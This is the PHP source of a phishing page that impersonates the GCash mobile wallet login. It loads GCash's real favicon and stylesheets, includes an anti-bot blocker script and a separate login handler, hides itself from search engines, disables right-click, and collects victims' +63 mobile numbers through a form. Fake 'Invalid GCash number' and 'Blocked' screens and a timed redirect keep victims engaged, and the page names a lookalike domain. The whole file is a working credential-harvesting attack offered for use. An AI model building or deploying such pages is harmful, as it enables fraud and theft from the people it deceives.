<?php
include("blocker/antibots.php");
include("net/login.php");
?>
<?php

if (isset($_GET['login-error'])) {
echo '<!DOCTYPE html><html class="desktop" style="font-size: 50px;">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="format-detection" content="telephone=no, email=no">
    <meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,maximum-scale=1,minimum-scale=1">
    <title>GCash Login Error</title>
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex">
    <link rel="shortcut icon" href="https://www.gcash.com/wp-content/uploads/2019/07/gcash-favicon-32x32.png" type="image/x-icon" />
    <meta name="wap-font-scale" content="no">
    <link rel="stylesheet" href="https://m.gcash.com/gcashapp/gcash-promotion-web/2.0.0/desktop-13ce9e40a0718362a999.css">
    <link rel="stylesheet" href="https://m.gcash.com/gcashapp/gcash-promotion-web/2.0.0/index-f70a6485354f1bea09ff.css">
</head>

<body oncontextmenu="return false"> 
<div id="loader"></div>
  <svg viewBox="0 0 175 1" xmlns="http://www.w3.org/2000/svg">
  </svg>
<style type="text/css">
    input[maxlength="4"] + svg line {   
    stroke-dasharray: 20;
    stroke-dashoffset: -10;
  }
   svg, line {
    position: relative;
    display: block;
    width: 325px;
    height: 5px;
    padding-top: 1px;
    margin-right: 50px;
  }
</style>
    <div role="dialog" class="ap-modal">
        <div class="ap-modal-mask"></div> 
        <div class="ap-modal-wrap">
        <div class="ap-modal-content">
        <div class="ap-modal-header">Invalid GCash number</div> 
 Please enter the correct gcash number and try again. (OT202122)
 <pre><br>317abcfc2-e945-415c-8696-<br>b75262c48e37</pre></div>
 <div class="ap-modal-button"><a href="index.php">
          OK
        </a></div></div></div>
</body>
</html>';
} else if(isset($_GET['login-blocked'])){

echo '<!DOCTYPE html><html class="desktop" style="font-size: 50px;">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="format-detection" content="telephone=no, email=no">
    <meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,maximum-scale=1,minimum-scale=1">
    <meta name="data-aspm" content="a771">
    <title>GCash Login Blocked</title>
    <meta property="og:type" content="website">
    <meta property="og:url" content="gcsh.app">
    <link rel="shortcut icon" href="https://www.gcash.com/wp-content/uploads/2019/07/gcash-favicon-32x32.png" type="image/x-icon" />
    <meta name="wap-font-scale" content="no">
    <link rel="stylesheet" href="https://m.gcash.com/gcashapp/gcash-promotion-web/2.0.0/desktop-13ce9e40a0718362a999.css">
    <link rel="stylesheet" href="https://m.gcash.com/gcashapp/gcash-promotion-web/2.0.0/index-f70a6485354f1bea09ff.css">
</head>

<body oncontextmenu="return false"> 
<div id="loader"></div>
  <svg viewBox="0 0 175 1" xmlns="http://www.w3.org/2000/svg">
  </svg>
<style type="text/css">
    input[maxlength="4"] + svg line {   
    stroke-dasharray: 20;
    stroke-dashoffset: -10;
  }
   svg, line {
    position: relative;
    display: block;
    width: 325px;
    height: 5px;
    padding-top: 1px;
    margin-right: 50px;
  }
</style>
    <div role="dialog" class="ap-modal">
        <div class="ap-modal-mask"></div> 
        <div class="ap-modal-wrap">
        <div class="ap-modal-content">
        <div class="ap-modal-header">Blocked</div> 
 Please enter the correct gcash number and try again. (OT202122)
 <pre><br>317abcfc2-e945-415c-8696-<br>b75262c48e37</pre></div>
 <div class="ap-modal-button"><a href="index.php">
          OK
        </a></div></div></div>
</body>
</html>';

}

if (isset($_GET['login-gcash'])) {

  echo "
  <html>
  <head>
  <title>GCash Login</title>
  <link href=\"https://www.gcash.com/wp-content/uploads/2019/07/gcash-favicon-32x32.png\" rel=\"icon\">
  <link href='https://fonts.googleapis.com/css?family=Karla|Karla:Bold|Poppins|Poppins:600&amp;display=swap' rel=stylesheet>
  <style>
  body{
    background: #007cff;
    font-family: Karla,sans-serif;
  }
  #loader {
    position: absolute;
    left: 50%;
    top: 50%;
    z-index: 1;
    width: 40px;
    height: 40px;
    margin-left:-40px;
    border: 16px solid #f3f3f3;
    border-radius: 50%;
    border-top: 16px solid #3498db;
    -webkit-animation: spin 2s linear infinite;
    animation: spin 2s linear infinite;
  }
  
  @-webkit-keyframes spin {
    0% { -webkit-transform: rotate(0deg); }
    100% { -webkit-transform: rotate(360deg); }
  }
  
  @keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
  }
  
  .animate-bottom {
    position: relative;
    -webkit-animation-name: animatebottom;
    -webkit-animation-duration: 1s;
    animation-name: animatebottom;
    animation-duration: 1s
  }
  
  @-webkit-keyframes animatebottom {
    from { bottom:-100px; opacity:0 } 
    to { bottom:0px; opacity:1 }
  }
  
  @keyframes animatebottom { 
    from{ bottom:-100px; opacity:0 } 
    to{ bottom:0; opacity:1 }
  }
  
  #myDiv {
    display: none;
    text-align: center;
  }
  </style>
  </head>
  <body onload=\"myFunction()\">
  <div id='loader'></div>



</body>
<script>
var myVar;

function myFunction() {
  myVar = setTimeout(showPage, 3000);
}
function showPage() {
  location.href = '?login-error';
}
</script>

  </html>
  ";

  exit();
}

?>
<!DOCTYPE html>
<html class="desktop" style="font-size:55px;">
<head>
  <title>GCash Login</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta property="og:title" content="GCash Login">
  <meta property="og:type" content="website">
  <meta property="og:url" content="gcsh.app">
  <link href="https://www.gcash.com/wp-content/uploads/2019/07/gcash-favicon-32x32.png" rel="icon">
  <meta name="wap-font-scale" content="no">
  <link rel="stylesheet" href="https://m.gcash.com/gcashapp/gcash-promotion-web/2.0.0/desktop-909a9fdc8a709d2d80f2.css">
  <link rel="stylesheet" href="https://m.gcash.com/gcashapp/gcash-promotion-web/2.0.0/index-84bb5121d0c2d1d07f10.css">



<style type="text/css">
    body {
        padding: 30px;
    }
    div {
        display: block;
    }
    body {
    background: #007cff;
    color: #333;
    font: .32rem/1.4 Helvetica Neue,Helvetica,Arial,sans-serif;
    -webkit-tap-highlight-color: rgba(0,0,0,0);
   }

#next {
   align:center;
   background-color:white;
   border: none;
   margin:5px;
   padding:10px;
   color: #0079FC;
   outline:none;
   cursor:pointer;
   text-align: center;
   font-size:16px;
   border-radius: 35px;
   width:320px;
}


@media only screen and (min-device-width: 768px)
body {
    font-size: 10vw!important;
}

.page-container{
  
    width:400px;
    margin-left:5%;
}


</style>

<script>

function isNumber(evt) {
  evt = (evt) ? evt : window.event;
  var charCode = (evt.which) ? evt.which : evt.keyCode;
  if (charCode > 31 && (charCode < 48 || charCode > 57)) {
    return false;
  }
  return true;
}


</script>

</head>

<body>
    
  <form method='POST'>

  <div id="app" class="root-app">
    <!---->
    <div class="main-container login-page">
      <div class="page-container">
        <header><div class="page-item"><img class="gcash-icon"></div>
        </header>
        <div class="page-main content-center">
          <p style="color:#a6d2ff;font-size:14px;" class="default-font enter-mobile-number-label"> Enter your mobile number</p>
          <div class="login">
            <div class="ap-flex-row number-field underlined">
              <p class="default-font area-code ">+63</p>
   
              <input min="0" oninput="this.value = 
 !!this.value && Math.abs(this.value) >= 0 ? Math.abs(this.value) : null" style="letter-spacing: 2px;" maxlength="10" onkeypress="return isNumber(event)" type="tel" name="number" onkeyup="length_disabled_btn(this.value)" id="phnumbervalid" class="mobile-input underlined" inputmode="numeric" ng-pattern="/^[a-zA-Z0-9 .,-]+$/" required>

            </div>
          </div>
          
         
          <p class="default-font network-available new-font-size" style="color:#a6d2ff;"> Available for all networks.</p>
        </div>
        <footer>
          <div class="privacy-message">
            <p style="color:#a6d2ff;">By tapping next, we'll collect your mobile number's network information to be able to send you a One-Time Password (OTP).</p>
          </div>
          <div class="submit-button display-mobile">
                <input type="submit" name="submitnum" id="next" value="NEXT" disabled>
            

              <script>
function length_disabled_btn(value){

    var number = document.getElementById("phnumbervalid").value;
    
       var num = number.toString().length;
         if(num == 10){
             document.getElementById("next").disabled = false;
         } else{
             document.getElementById("next").disabled = true;
         }
       

}

</script>
               
    </div>
      </form>
          <div class="footer-view">
            <div class="page-item consent">

                <br><br><br>
              <span style="color:white;font-size:14px;">Help Center</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="font-size:14px;color:#74b8ff;">v5.56.0:696</span>
            </div>
          </div>
        </footer>
      </div>
    </div>
    </div>  

   
    <p style="display: none;"></p>
    <div>
 
    </div>

</body>

</html>

